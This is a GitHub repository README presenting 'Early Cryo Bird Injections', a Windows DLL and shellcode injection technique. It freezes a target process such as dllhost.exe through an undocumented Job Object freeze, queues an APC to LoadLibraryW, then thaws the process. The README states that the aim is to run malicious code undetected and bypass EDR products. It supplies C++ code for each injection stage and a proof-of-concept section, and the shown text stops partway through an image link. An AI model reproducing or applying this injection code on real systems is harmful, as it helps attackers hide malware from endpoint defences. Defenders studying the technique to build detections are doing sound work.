# https://github.com/zero2504/Early-Cryo-Bird-Injections

[Skip to content](https://github.com/zero2504/Early-Cryo-Bird-Injections#start-of-content)

You signed in with another tab or window. [Reload](https://github.com/zero2504/Early-Cryo-Bird-Injections) to refresh your session.You signed out in another tab or window. [Reload](https://github.com/zero2504/Early-Cryo-Bird-Injections) to refresh your session.You switched accounts on another tab or window. [Reload](https://github.com/zero2504/Early-Cryo-Bird-Injections) to refresh your session.Dismiss alert

{{ message }}

[zero2504](https://github.com/zero2504)/ **[Early-Cryo-Bird-Injections](https://github.com/zero2504/Early-Cryo-Bird-Injections)** Public

- [Notifications](https://github.com/login?return_to=%2Fzero2504%2FEarly-Cryo-Bird-Injections) You must be signed in to change notification settings
- [Fork\\
18](https://github.com/login?return_to=%2Fzero2504%2FEarly-Cryo-Bird-Injections)
- [Star\\
136](https://github.com/login?return_to=%2Fzero2504%2FEarly-Cryo-Bird-Injections)


Early Bird Cryo Injections – APC-based DLL & Shellcode Injection via Pre-Frozen Job Objects


### License

[MIT license](https://github.com/zero2504/Early-Cryo-Bird-Injections/blob/main/LICENSE)

[136\\
stars](https://github.com/zero2504/Early-Cryo-Bird-Injections/stargazers) [18\\
forks](https://github.com/zero2504/Early-Cryo-Bird-Injections/forks) [Branches](https://github.com/zero2504/Early-Cryo-Bird-Injections/branches) [Tags](https://github.com/zero2504/Early-Cryo-Bird-Injections/tags) [Activity](https://github.com/zero2504/Early-Cryo-Bird-Injections/activity)

[Star](https://github.com/login?return_to=%2Fzero2504%2FEarly-Cryo-Bird-Injections)

[Notifications](https://github.com/login?return_to=%2Fzero2504%2FEarly-Cryo-Bird-Injections) You must be signed in to change notification settings

# zero2504/Early-Cryo-Bird-Injections

main

[**1** Branch](https://github.com/zero2504/Early-Cryo-Bird-Injections/branches) [**0** Tags](https://github.com/zero2504/Early-Cryo-Bird-Injections/tags)

[Go to Branches page](https://github.com/zero2504/Early-Cryo-Bird-Injections/branches)[Go to Tags page](https://github.com/zero2504/Early-Cryo-Bird-Injections/tags)

Go to file

Code

Open more actions menu

## Folders and files

| Name | Name | Last commit message | Last commit date |
| --- | --- | --- | --- |
| ## Latest commit<br>[![zero2504](https://avatars.githubusercontent.com/u/84348823?v=4&size=40)](https://github.com/zero2504)[zero2504](https://github.com/zero2504/Early-Cryo-Bird-Injections/commits?author=zero2504)<br>[Update README.md](https://github.com/zero2504/Early-Cryo-Bird-Injections/commit/60008c841fa7f0b5895d07aef79afefc99fa5c2d)<br>11 months agoApr 6, 2025<br>[60008c8](https://github.com/zero2504/Early-Cryo-Bird-Injections/commit/60008c841fa7f0b5895d07aef79afefc99fa5c2d) · 11 months agoApr 6, 2025<br>## History<br>[9 Commits](https://github.com/zero2504/Early-Cryo-Bird-Injections/commits/main/) <br>Open commit details<br>[View commit history for this file.](https://github.com/zero2504/Early-Cryo-Bird-Injections/commits/main/) 9 Commits |
| [Early-Cryo-Bird- DLL-Injection.cpp](https://github.com/zero2504/Early-Cryo-Bird-Injections/blob/main/Early-Cryo-Bird-%20DLL-Injection.cpp "Early-Cryo-Bird- DLL-Injection.cpp") | [Early-Cryo-Bird- DLL-Injection.cpp](https://github.com/zero2504/Early-Cryo-Bird-Injections/blob/main/Early-Cryo-Bird-%20DLL-Injection.cpp "Early-Cryo-Bird- DLL-Injection.cpp") | [Rename Early-Cryo-Bird- DLL-Injection to Early-Cryo-Bird- DLL-Injecti…](https://github.com/zero2504/Early-Cryo-Bird-Injections/commit/b7d898fb7c01650229ae07a23d10cf0e0e2f78fc "Rename Early-Cryo-Bird- DLL-Injection to Early-Cryo-Bird- DLL-Injection.cpp") | 11 months agoApr 4, 2025 |
| [Early-Cryo-Bird-Shellcode-Injection.cpp](https://github.com/zero2504/Early-Cryo-Bird-Injections/blob/main/Early-Cryo-Bird-Shellcode-Injection.cpp "Early-Cryo-Bird-Shellcode-Injection.cpp") | [Early-Cryo-Bird-Shellcode-Injection.cpp](https://github.com/zero2504/Early-Cryo-Bird-Injections/blob/main/Early-Cryo-Bird-Shellcode-Injection.cpp "Early-Cryo-Bird-Shellcode-Injection.cpp") | [Create Early-Cryo-Bird-Shellcode-Injection.cpp](https://github.com/zero2504/Early-Cryo-Bird-Injections/commit/9e6ac743f9e8e55ceddea7a81df246f12685252f "Create Early-Cryo-Bird-Shellcode-Injection.cpp") | 11 months agoApr 4, 2025 |
| [LICENSE](https://github.com/zero2504/Early-Cryo-Bird-Injections/blob/main/LICENSE "LICENSE") | [LICENSE](https://github.com/zero2504/Early-Cryo-Bird-Injections/blob/main/LICENSE "LICENSE") | [Initial commit](https://github.com/zero2504/Early-Cryo-Bird-Injections/commit/db16f8f07c6cce742f0fa405fd35b67f7a9ccd42 "Initial commit") | 11 months agoApr 4, 2025 |
| [README.md](https://github.com/zero2504/Early-Cryo-Bird-Injections/blob/main/README.md "README.md") | [README.md](https://github.com/zero2504/Early-Cryo-Bird-Injections/blob/main/README.md "README.md") | [Update README.md](https://github.com/zero2504/Early-Cryo-Bird-Injections/commit/60008c841fa7f0b5895d07aef79afefc99fa5c2d "Update README.md") | 11 months agoApr 6, 2025 |
| View all files |

## Repository files navigation

# 🧊 Early Cryo Bird Injections - APC-based DLL & Shellcode Injection via Pre-Frozen Job Objects

[Permalink: 🧊 Early Cryo Bird Injections - APC-based DLL & Shellcode Injection via Pre-Frozen Job Objects](https://github.com/zero2504/Early-Cryo-Bird-Injections#-early-cryo-bird-injections---apc-based-dll--shellcode-injection-via-pre-frozen-job-objects)

## Table of Contents

[Permalink: Table of Contents](https://github.com/zero2504/Early-Cryo-Bird-Injections#table-of-contents)

- [Introduction](https://github.com/zero2504/Early-Cryo-Bird-Injections##introduction)
- [Theoretical Foundations](https://github.com/zero2504/Early-Cryo-Bird-Injections##theoretical-foundations)
  - [Windows Job Objects](https://github.com/zero2504/Early-Cryo-Bird-Injections###windows-job-objects)
  - [Asynchronous Procedure Calls (APC)](https://github.com/zero2504/Early-Cryo-Bird-Injections###asynchronous-procedure-calls-apc)
  - [QueueUserAPC](https://github.com/zero2504/Early-Cryo-Bird-Injections###QueueUserAPC)
  - [Early Bird Injection](https://github.com/zero2504/Early-Cryo-Bird-Injections###EarlyBirdInjection)
- [Early Cryo Bird Injection via Pre-Frozen Process in a Job Object](https://github.com/zero2504/Early-Cryo-Bird-Injections#EarlyCryoBirdInjectionviaPre-FrozenProcessinaJobObject)
  - [DLL Injection](https://github.com/zero2504/Early-Cryo-Bird-Injections##early-cryo-bird-dll-injection)
  - [Shellcode Injection](https://github.com/zero2504/Early-Cryo-Bird-Injections##early-cryo-bird-shellcode-injection)
- [Detection & EDR Evaluation](https://github.com/zero2504/Early-Cryo-Bird-Injections#early-bird-cryo-injections-versus-edrs)
- [Conclusion](https://github.com/zero2504/Early-Cryo-Bird-Injections#Conclusion)
- [References](https://github.com/zero2504/Early-Cryo-Bird-Injections#References)

## 📘 Introduction

[Permalink: 📘 Introduction](https://github.com/zero2504/Early-Cryo-Bird-Injections#-introduction)

After my initial work with Windows Job Objects and the possibility of freezing a process in an alternative way, I wrote a new paper to explore these topics in more depth and have summarized them here. It’s quite a lot of content, and I initially planned to build a multi-part series but then I decided to compile everything into one single paper and just publish it.

**Process Injection** is a widely used technique to execute malicious code within the context of a legitimate process without being detected. Common methods such as **Early Bird Injection**, **APC Injection**, or **Thread Hijacking** are frequently employed, but are increasingly detected and blocked by modern security mechanisms.

This paper introduces an additional technique called **"Early Cryo Bird Injections"** plural, because it includes not only **shellcode injection**, but also **DLL injection**. This method leverages an undocumented Windows function based on **Windows Job Objects**, which allows a process to be frozen without requiring suspicious flags like **CREATE\_SUSPENDED** or **DEBUG\_PROCESS**. The goal was to bypass **Endpoint Detection and Response (EDR)** solutions. The approach combines **process freezing ("Cryo") via Job Objects**, which create the process already in a frozen state and uses **Asynchronous Procedure Calls (APC)**, in order to discreetly inject malicious code or load a DLL into the target process.

During the development phase, it became clear that **Cortex**, using a **YARA rule**, monitors memory page transitions from **RW (Read-Write)** to **RX (Read-Execute)**. Despite multiple attempts to bypass this detection using different memory protection strategies (Code Caves), the approach remained detectable. As a result, I decided to additionally implement **DLL injection via APC** into the frozen process.

In the second part of my series, I will present further findings and dive deeper into the technical details of this method.

## 🧠 Theoretical Foundations

[Permalink: 🧠 Theoretical Foundations](https://github.com/zero2504/Early-Cryo-Bird-Injections#-theoretical-foundations)

### 📦 Windows Job Objects

[Permalink: 📦 Windows Job Objects](https://github.com/zero2504/Early-Cryo-Bird-Injections#-windows-job-objects)

Windows Job Objects are specialized kernel-level constructs that allow multiple processes to be grouped together and managed as a single unit. This capability is particularly useful in scenarios where:

- All child processes of a tool (e.g., during a build process) need to be started, constrained, or terminated collectively.
- A server process must impose resource limits on requests from individual clients.
- Processes are to be executed within a controlled, sandbox-like environment.

> 💡 **Note:** By default, Windows does not maintain a strict parent-child relationship between processes, a child process can continue executing even if its parent terminates. Job Objects effectively address this limitation by enforcing group-based process control.

### 🧵 Asynchronous Procedure Calls (APC)

[Permalink: 🧵 Asynchronous Procedure Calls (APC)](https://github.com/zero2504/Early-Cryo-Bird-Injections#-asynchronous-procedure-calls-apc)

An APC (Asynchronous Procedure Call) is a function that is executed asynchronously in the context of a specific thread. When an APC is added to a thread, the system triggers a software interrupt, which executes the APC function during the next scheduling of that thread. For this to work, the thread must be in a so-called "alertable state," which can be achieved through API calls such as `SleepEx` or `WaitForSingleObjectEx`. One could say that APCs are the "Post-It notes" of the operating system, reminding threads: "Hey, don't forget to execute this!"

### 📥 QueueUserAPC

[Permalink: 📥 QueueUserAPC](https://github.com/zero2504/Early-Cryo-Bird-Injections#-queueuserapc)

The Windows API function `QueueUserAPC` allows adding a user-mode APC to the queue of a thread:

```
DWORD QueueUserAPC(
  PAPCFUNC pfnAPC,
  HANDLE hThread,
  ULONG_PTR dwData
);
```

### 🐦 Early Bird Injection

[Permalink: 🐦 Early Bird Injection](https://github.com/zero2504/Early-Cryo-Bird-Injections#-early-bird-injection)

Early Bird Injection creates processes in a suspended state using flags such as `CREATE_SUSPENDED` or `DEBUG_PROCESS`, allowing preparation of the target process before it starts running. However, it has become well-known to many EDR solutions and is now considered an "old hat."

# 🚀 Early Cryo Bird Injection via Pre-Frozen Process in a Job Object

[Permalink: 🚀 Early Cryo Bird Injection via Pre-Frozen Process in a Job Object](https://github.com/zero2504/Early-Cryo-Bird-Injections#-early-cryo-bird-injection-via-pre-frozen-process-in-a-job-object)

## 💉 Early Cryo Bird DLL-Injection

[Permalink: 💉 Early Cryo Bird DLL-Injection](https://github.com/zero2504/Early-Cryo-Bird-Injections#-early-cryo-bird-dll-injection)

The presented technique introduces a DLL injection that leverages **undocumented Windows internals**, specifically the **freezing capabilities of Windows Job Objects** via the `NtSetInformationJobObject` API in combination with the `JOBOBJECT_FREEZE_INFORMATION` structure. In contrast to conventional injection strategies that rely on `CREATE_SUSPENDED` or `DEBUG_PROCESS` flags, often flagged by Endpoint Detection and Response (EDR) systems. This method enables control of process execution through job-level manipulation.

By creating a target process directly within a pre-frozen Job Object, memory operations such as allocation and writing of a **DLL path** can be performed while the process remains inactive, thus minimizing detectable behavioral anomalies. The DLL is subsequently loaded via a **queued Asynchronous Procedure Call (APC)** targeting the `LoadLibraryA` function. Once the process is "thawed" by resetting the freeze state, the APC is executed, and the DLL is injected and initialized within the target context.

## 🎯 **Key Advantages:**

[Permalink: 🎯 Key Advantages:](https://github.com/zero2504/Early-Cryo-Bird-Injections#-key-advantages)

- Utilizes **native NT system calls**, bypassing higher-level, monitored API layers
- **Eliminates the need for classical suspension flags**, reducing visibility to EDR solutions
- Offers **precise execution control** through Job-based process freezing and thawing
- **Supports both DLL and shellcode injection** payloads

## 🧩 **Step-by-Step Breakdown**

[Permalink: 🧩 Step-by-Step Breakdown](https://github.com/zero2504/Early-Cryo-Bird-Injections#-step-by-step-breakdown)

### **1\. Create Job Object**

[Permalink: 1. Create Job Object](https://github.com/zero2504/Early-Cryo-Bird-Injections#1-create-job-object)

A new, empty Job Object is created using `CreateJobObjectW`. This object acts as a container for the target process and allows fine-grained control over its execution.

### **2\. Enable Freeze Behavior**

[Permalink: 2. Enable Freeze Behavior](https://github.com/zero2504/Early-Cryo-Bird-Injections#2-enable-freeze-behavior)

The job is configured via `NtSetInformationJobObject` with `JOBOBJECT_FREEZE_INFORMATION`, which sets the `Freeze` flag to `TRUE`.

### **3\. Initialize Attribute List**

[Permalink: 3. Initialize Attribute List](https://github.com/zero2504/Early-Cryo-Bird-Injections#3-initialize-attribute-list)

The `STARTUPINFOEXW` structure is prepared, and an attribute list (`PROC_THREAD_ATTRIBUTE_LIST`) is allocated to support extended process creation attributes.

### **4\. Bind Job to Attributes**

[Permalink: 4. Bind Job to Attributes](https://github.com/zero2504/Early-Cryo-Bird-Injections#4-bind-job-to-attributes)

The Job Object is linked to the attribute list using `UpdateProcThreadAttribute`. This ensures that any process created with this attribute list is automatically assigned to the Job upon creation.

### **5\. Create Target Process in a Frozen Job**

[Permalink: 5. Create Target Process in a Frozen Job](https://github.com/zero2504/Early-Cryo-Bird-Injections#5-create-target-process-in-a-frozen-job)

The target process (e.g., `dllhost.exe`) is created using `CreateProcessW` with the `EXTENDED_STARTUPINFO_PRESENT` flag. It starts inside the job in a frozen state.

### **6\. Allocate Memory in Target**

[Permalink: 6. Allocate Memory in Target](https://github.com/zero2504/Early-Cryo-Bird-Injections#6-allocate-memory-in-target)

Memory is allocated using `NtAllocateVirtualMemoryEx` for storing the DLL path.

### **7\. Write DLL Path into Memory**

[Permalink: 7. Write DLL Path into Memory](https://github.com/zero2504/Early-Cryo-Bird-Injections#7-write-dll-path-into-memory)

The path to the DLL is written to the allocated region via `NtWriteVirtualMemory`.

### **8\. Queue APC for LoadLibraryW**

[Permalink: 8. Queue APC for LoadLibraryW](https://github.com/zero2504/Early-Cryo-Bird-Injections#8-queue-apc-for-loadlibraryw)

An APC is queued in the primary thread using `NtQueueApcThread`. The callback is `LoadLibraryW`, and the DLL path is passed as an argument.

### **9\. Unfreeze/Thaw the Process**

[Permalink: 9. Unfreeze/Thaw the Process](https://github.com/zero2504/Early-Cryo-Bird-Injections#9-unfreezethaw-the-process)

Using `NtSetInformationJobObject`, the freeze is lifted (`Freeze = FALSE`).

### **10\. APC Executes → DLL is Loaded**

[Permalink: 10. APC Executes → DLL is Loaded](https://github.com/zero2504/Early-Cryo-Bird-Injections#10-apc-executes--dll-is-loaded)

Once the process enters an alertable state, the APC is executed, resulting in DLL injection and execution.

### 🔄 Injection Flow:

[Permalink: 🔄 Injection Flow:](https://github.com/zero2504/Early-Cryo-Bird-Injections#-injection-flow)

[![e93c1b79f5a291a0e4caf7165337d109_MD5](https://private-user-images.githubusercontent.com/84348823/430519427-668707e2-669c-4041-998c-64988612a3d0.jpeg?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NzE0MTI5ODgsIm5iZiI6MTc3MTQxMjY4OCwicGF0aCI6Ii84NDM0ODgyMy80MzA1MTk0MjctNjY4NzA3ZTItNjY5Yy00MDQxLTk5OGMtNjQ5ODg2MTJhM2QwLmpwZWc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjYwMjE4JTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI2MDIxOFQxMTA0NDhaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT1kZjc1N2MwMDcyZDdmZWUxZjJkMGQ0Y2UwZDRlZmE2MjZhZGFlZjk1MGZlNWQ3MDQzZDFkMmM5NDM3YjU1N2E2JlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.1U3rnCAJRxMQG9vyD2RkcpbiLX7PFeIysPDtv-NQZO8)](https://private-user-images.githubusercontent.com/84348823/430519427-668707e2-669c-4041-998c-64988612a3d0.jpeg?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NzE0MTI5ODgsIm5iZiI6MTc3MTQxMjY4OCwicGF0aCI6Ii84NDM0ODgyMy80MzA1MTk0MjctNjY4NzA3ZTItNjY5Yy00MDQxLTk5OGMtNjQ5ODg2MTJhM2QwLmpwZWc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjYwMjE4JTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI2MDIxOFQxMTA0NDhaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT1kZjc1N2MwMDcyZDdmZWUxZjJkMGQ0Y2UwZDRlZmE2MjZhZGFlZjk1MGZlNWQ3MDQzZDFkMmM5NDM3YjU1N2E2JlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.1U3rnCAJRxMQG9vyD2RkcpbiLX7PFeIysPDtv-NQZO8)

### ⚙️ Some Technical Implementation

[Permalink: ⚙️ Some Technical Implementation](https://github.com/zero2504/Early-Cryo-Bird-Injections#%EF%B8%8F-some-technical-implementation)

#### ❄️🧊 Job-Create and Freezing:

[Permalink: ❄️🧊 Job-Create and Freezing:](https://github.com/zero2504/Early-Cryo-Bird-Injections#%EF%B8%8F-job-create-and-freezing)

```
NTSTATUS creationJob = NtCreateJobObject(&hJob, STANDARD_RIGHTS_ALL | 63, NULL);
 if (!NT_SUCCESS(creationJob)) {
     SetColor(FOREGROUND_RED);
     printf("Error: 0x%X\n", creationJob);
     CloseHandle(hJob);
     return -1;
 }

 JOBOBJECT_FREEZE_INFORMATION freezeInfo = { 0 };
 freezeInfo.FreezeOperation = 1; // Initiate freeze
 freezeInfo.Freeze = TRUE;

 NTSTATUS freezeStatus = NtSetInformationJobObject(hJob, (JOBOBJECTINFOCLASS)JobObjectFreezeInformation, &freezeInfo, sizeof(freezeInfo));
 if (!NT_SUCCESS(freezeStatus)) {
     SetColor(FOREGROUND_RED);
     printf("Error: 0x%X\n", freezeStatus);
     CloseHandle(hJob);
     return -1;
 }
```

#### 🚫 Process Creation Without Flags

[Permalink: 🚫 Process Creation Without Flags](https://github.com/zero2504/Early-Cryo-Bird-Injections#-process-creation-without-flags)

```
// Create process in the job (e.g. dllhost.exe)
PROCESS_INFORMATION pi = { 0 };
if (!CreateProcessW(
    L"C:\\Windows\\System32\\dllhost.exe",
    NULL,
    NULL,
    NULL,
    FALSE,
    EXTENDED_STARTUPINFO_PRESENT,
    NULL,
    NULL,
    &siEx.StartupInfo,
    &pi))
{
    std::cerr << "CreateProcessW failed: " << GetLastError() << std::endl;
    DeleteProcThreadAttributeList(siEx.lpAttributeList);
    HeapFree(GetProcessHeap(), 0, siEx.lpAttributeList);
    CloseHandle(hJob);
    return -1;
}
std::cout << "[+] Started Process in Job! PID: " << pi.dwProcessId << std::endl;

// Release attribute list
DeleteProcThreadAttributeList(siEx.lpAttributeList);
HeapFree(GetProcessHeap(), 0, siEx.lpAttributeList);
```

#### 📬🧵 NtQueueApcThread (QueueUserAPC)

[Permalink: 📬🧵 NtQueueApcThread (QueueUserAPC)](https://github.com/zero2504/Early-Cryo-Bird-Injections#-ntqueueapcthread-queueuserapc)

```
HMODULE hKernel32 = GetModuleHandleW(L"kernel32.dll");
if (hKernel32 == NULL) {
    SetColor(FOREGROUND_RED);
    printf("[-] Error retrieving Kernel32-Module\n");
    CloseHandle(hJob);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return -1;
}

FARPROC loadLibAddr = GetProcAddress(hKernel32, pAddress);
if (!loadLibAddr) {
    printf("Error retrieving the address of LoadLibraryW.\n");
    CloseHandle(hJob);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return -1;
}
if (!NT_SUCCESS(NtQueueApcThread(pi.hThread, (PVOID)loadLibAddr, remoteMemory, NULL, NULL))) {
    printf("NtQueueApcThread failed...\n");
    CloseHandle(hJob);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return -1;
}
SetColor(FOREGROUND_INTENSITY);
printf("[+] APC has been successfully installed. The DLL is loaded during defrosting.\n");
```

#### 🔓🔥 Job-Thawing

[Permalink: 🔓🔥 Job-Thawing](https://github.com/zero2504/Early-Cryo-Bird-Injections#-job-thawing)

```
freezeInfo.FreezeOperation = 1; // Unfreeze operation
freezeInfo.Freeze = FALSE;

NTSTATUS unfreezeStatus = NtSetInformationJobObject(hJob, (JOBOBJECTINFOCLASS)JobObjectFreezeInformation, &freezeInfo, sizeof(freezeInfo));
if (!NT_SUCCESS(unfreezeStatus)) {
    SetColor(FOREGROUND_RED);
    printf("Error: 0x%X\n", unfreezeStatus);
    CloseHandle(hJob);
    return -1;
}
```

### 🎥 Proof of Concept

[Permalink: 🎥 Proof of Concept](https://github.com/zero2504/Early-Cryo-Bird-Injections#-proof-of-concept)

[![Screenshot 2025-04-04 203016](https://private-user-images.githubusercontent.com/84348823/430522940-66c2bde6-f1c6-4d3e-bccd-52b5e21bfbf0.png?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NzE0MTI5ODgsIm5iZiI6MTc3MTQxMjY4OCwicGF0aCI6Ii84NDM0ODgyMy80MzA1MjI5NDAtNjZjMmJkZTYtZjFjNi00ZDNlLWJjY2QtNTJiNWUyMWJmYmYwLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNjAyMTglMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjYwMjE4VDExMDQ0OFomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWVmZDgzNTM3YTEyMDFhOWVmMjAxYWQ0MmI5NTkyOTZmOWNhYjdiYTY3YmQ0Mjk3ZTZlYTI1Y2Y1MWY4MDU0ZDQmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.8NoCToGNZ7WARW_Ej7b_onnwgP7vDHZHdEyxosgYACU)](https://private-user-images.githubusercontent.com/84348823/430522940-66c2bde6-f1c6-4d3e-bccd-52b5e21bfbf0.png?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NzE0MTI5ODgsIm5iZiI6MTc3MTQxMjY4OCwicGF0aCI6Ii84NDM0ODgyMy80MzA1MjI5NDAtNjZjMmJkZTYtZjFjNi00ZDNlLWJjY2QtNTJiNWUyMWJmYmYwLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNjAyMTglMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjYwMjE4VDExMDQ0OFomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWVmZDgzNTM3YTEyMDFhOWVmMjAxYWQ0MmI5NTkyOTZmOWNhYjdiYTY3YmQ0Mjk3ZTZlYTI1Y2Y1MWY4MDU0ZDQmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.8NoCToGNZ7WARW_Ej7b_onnwgP7vDHZHdEyxosgYACU)

### ⚖️ Differences between Frozen Process and Suspended Process

[Permalink: ⚖️ Differences between Frozen Process and Suspended Process](https://github.com/zero2504/Early-Cryo-Bird-Injections#%EF%B8%8F-differences-between-frozen-process-and-suspended-process)

##### 🧵 Threads

[Permalink: 🧵 Threads](https://github.com/zero2504/Early-Cryo-Bird-Injections#-threads)

[![DLL_Injection_New_Thread](https://private-user-images.githubusercontent.com/84348823/430523400-cbd36e04-7124-4455-82a8-5efa3a6de3b2.png?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NzE0MTI5ODgsIm5iZiI6MTc3MTQxMjY4OCwicGF0aCI6Ii84NDM0ODgyMy80MzA1MjM0MDAtY2JkMzZlMDQtNzEyNC00NDU1LTgyYTgtNWVmYTNhNmRlM2IyLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNjAyMTglMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjYwMjE4VDExMDQ0OFomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTRmN2JjMTg0NTY1ZjZjMWI3NTFiMDdhOGJkMzNjMDE0ZjA1NmIyN2I4YzA3YTU5YzgyNGYwNzhmMjFmYjk5NmEmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.DTlwcWCmWW83-BKqF5Ovh05quLDMVtaM3HjzNOee2VI)](https://private-user-images.githubusercontent.com/84348823/430523400-cbd36e04-7124-4455-82a8-5efa3a6de3b2.png?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NzE0MTI5ODgsIm5iZiI6MTc3MTQxMjY4OCwicGF0aCI6Ii84NDM0ODgyMy80MzA1MjM0MDAtY2JkMzZlMDQtNzEyNC00NDU1LTgyYTgtNWVmYTNhNmRlM2IyLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNjAyMTglMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjYwMjE4VDExMDQ0OFomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTRmN2JjMTg0NTY1ZjZjMWI3NTFiMDdhOGJkMzNjMDE0ZjA1NmIyN2I4YzA3YTU5YzgyNGYwNzhmMjFmYjk5NmEmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.DTlwcWCmWW83-BKqF5Ovh05quLDMVtaM3HjzNOee2VI)

##### ⏱️ Time

[Permalink: ⏱️ Time](https://github.com/zero2504/Early-Cryo-Bird-Injections#%EF%B8%8F-time)

[![DLL_Injection_New_Statistics(RunningTime)](https://private-user-images.githubusercontent.com/84348823/430523778-25ca405e-df41-40d5-8ffd-8ccb29e682a2.png?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NzE0MTI5ODgsIm5iZiI6MTc3MTQxMjY4OCwicGF0aCI6Ii84NDM0ODgyMy80MzA1MjM3NzgtMjVjYTQwNWUtZGY0MS00MGQ1LThmZmQtOGNjYjI5ZTY4MmEyLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNjAyMTglMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjYwMjE4VDExMDQ0OFomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTExNjQxNDg4OWQwYmM5MmQ1MjJkYzc0ZmJkZmEwYmM1MmRlN2VmNjk2MWM4NDk0YTc1MWQ1MWU3YzYwM2I2ZjEmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.Rwf9jI6ExDdbSmHZYt3O37adZ7VQrjUhbdwcKDq_SCU)](https://private-user-images.githubusercontent.com/84348823/430523778-25ca405e-df41-40d5-8ffd-8ccb29e682a2.png?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NzE0MTI5ODgsIm5iZiI6MTc3MTQxMjY4OCwicGF0aCI6Ii84NDM0ODgyMy80MzA1MjM3NzgtMjVjYTQwNWUtZGY0MS00MGQ1LThmZmQtOGNjYjI5ZTY4MmEyLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFL